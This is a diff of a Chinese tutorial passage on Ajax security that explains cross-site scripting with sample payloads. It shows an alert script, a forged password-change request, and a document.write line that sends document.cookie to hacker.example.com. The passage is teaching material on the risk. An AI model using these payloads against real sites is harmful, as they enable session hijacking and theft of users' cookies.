@@ -194,23 +194,23 @@ Ajax 本身并不会产生任何安全风险，但是将网站变成 Ajax 化的
 XSS 或跨站脚本攻击利用了通过用户输入或某种方式通过 URL 进行网站脚本添加的能力。让我们以允许用户输入其个人简介的流行 Twitter 网站为例。考虑以下输入**Bio**字段：
 
 ```php
-    <script>alert('XSS');</script>
+<script>alert('XSS');</script>
 
-    ```
+```
 
 如果 Twitter 工程师允许 HTML 执行，或者在显示它们之前没有对条目进行净化，它将提示一个带有文本**XSS**的警报框。在现实世界的情况下，它不会是一个警报框，而可能是恶意活动，比如通过已知 URL 模仿用户输入或窃取用户数据或劫持会话：
 
 ```php
-    ajaxReq('http://example.com/updateUser.php?passwd=xyz');
+ajaxReq('http://example.com/updateUser.php?passwd=xyz');
 
-    ```
+```
 
 通常，黑客可能无法直接访问`updateUser.php`页面；但是 JavaScript 代码可以完全访问，因为它在当前会话范围内。因此，在这里，我们还必须看看我们的架构：
 
 ```php
-    document.write('<img src= "http://hacker.example.com/storeHackedData.php?' + document.cookie + '" />';
+document.write('<img src= "http://hacker.example.com/storeHackedData.php?' + document.cookie + '" />';
 
-    ```
+```
 
 有了执行这个恶意代码的能力，黑客可能开始窃取浏览器 cookie。通过 cookie 中的会话 ID，黑客可能劫持用户的会话。
 
